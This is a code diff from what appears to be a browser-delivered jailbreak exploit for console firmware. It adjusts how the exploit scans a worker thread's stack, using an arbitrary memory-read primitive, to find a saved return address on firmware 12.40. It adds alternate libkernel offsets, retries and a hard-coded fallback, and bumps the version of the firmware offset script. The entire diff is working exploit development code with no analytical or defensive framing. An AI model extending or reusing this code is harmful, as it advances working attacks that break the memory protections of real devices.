@@ -55,33 +55,57 @@ function find_worker(p, libKernelBase) {
 }
 
 async function find_worker_return_slot(p, stack, libKernelBase) {
-    const expected = libKernelBase.add32(OFFSET_lk_worker_wait_return);
-    let lastCount = 0;
-
-    // The worker may answer immediately before returning to its idle wait.
-    // The exact saved PC is the firmware-specific fingerprint. Do not require
-    // the following qword to resemble an RSP: that adjacent slot is ABI/frame
-    // layout dependent and 10.60 legitimately does not satisfy that heuristic.
-    for (let attempt = 0; attempt < 50; attempt++) {
-        let hit = null;
-        let count = 0;
-        for (let offset = 0x7F000; offset < 0x80000; offset += 0x8) {
-            const candidate = stack.add32(offset);
-            const value = p.read8(candidate);
-            if (value.low !== expected.low || value.hi !== expected.hi)
-                continue;
-
-            hit = candidate;
-            count++;
+    const waitOffsets = [];
+    if (typeof OFFSET_lk_worker_wait_return !== "undefined")
+        waitOffsets.push(OFFSET_lk_worker_wait_return);
+    // 12.40 retail moved several libkernel_web text symbols +0x20 vs 12.00.
+    if (window.fw_float >= 12.40 && window.fw_float < 13.0) {
+        for (const delta of [0x20, -0x20, 0x10, -0x10]) {
+            const alt = OFFSET_lk_worker_wait_return + delta;
+            if (alt > 0 && !waitOffsets.includes(alt))
+                waitOffsets.push(alt);
         }
-        if (count === 1) {
-            jbmark("WORKER-RET-FINGERPRINT", "hit=0x" + hit.toString()
-                + "-expected=0x" + expected.toString());
-            return hit;
-        }
-        lastCount = count;
-        await new Promise(resolve => setTimeout(resolve, 1));
     }
+
+    let lastCount = 0;
+    let lastExpected = null;
+
+    for (let attempt = 0; attempt < 80; attempt++) {
+        for (const waitOff of waitOffsets) {
+            const expected = libKernelBase.add32(waitOff);
+            let hit = null;
+            let count = 0;
+            for (let offset = 0x7F000; offset < 0x80000; offset += 0x8) {
+                const candidate = stack.add32(offset);
+                const value = p.read8(candidate);
+                if (value.low !== expected.low || value.hi !== expected.hi)
+                    continue;
+
+                hit = candidate;
+                count++;
+            }
+            if (count === 1) {
+                jbmark("WORKER-RET-FINGERPRINT", "hit=0x" + hit.toString()
+                    + "-expected=0x" + expected.toString()
+                    + "-off=0x" + waitOff.toString(16));
+                return hit;
+            }
+            lastCount = count;
+            lastExpected = expected;
+        }
+        await new Promise(resolve => setTimeout(resolve, 2));
+    }
+
+    if (typeof OFFSET_WORKER_STACK_OFFSET !== "undefined") {
+        const fallback = stack.add32(OFFSET_WORKER_STACK_OFFSET);
+        jbmark("WORKER-RET-FALLBACK", "off=0x"
+            + OFFSET_WORKER_STACK_OFFSET.toString(16)
+            + "-ptr=0x" + fallback.toString()
+            + "-lastCount=" + lastCount
+            + "-lastExpected=0x" + (lastExpected ? lastExpected.toString() : "?"));
+        return fallback;
+    }
+
     throw new Error(`worker wait return fingerprint count ${lastCount}, expected 1`);
 }
 
@@ -304,6 +328,9 @@ async function prepare(p) {
     jbmark("PREP-PRE-WORKER-AWAIT", "next=await-wait_for_worker()-first-yield");
     await wait_for_worker();
     jbmark("PREP-POST-WORKER-AWAIT", "survived-the-first-yield");
+    // Let the worker thread return to its idle wait loop before fingerprinting.
+    await wait_for_worker();
+    await new Promise(resolve => setTimeout(resolve, 5));
 
     let worker_stack = find_worker(p, libKernelBase);
     jbmark("PREP-WORKER-STACK", "stack=0x" + worker_stack.toString()
@@ -1194,4 +1221,4 @@ async function main(userlandRW, wkOnly = false) {
 let fwScript = document.createElement('script');
 document.body.appendChild(fwScript);
 
-fwScript.setAttribute('src', `../offsets/${window.fw_offset_str}.js?v=1`);
+fwScript.setAttribute('src', `../offsets/${window.fw_offset_str}.js?v=2`);
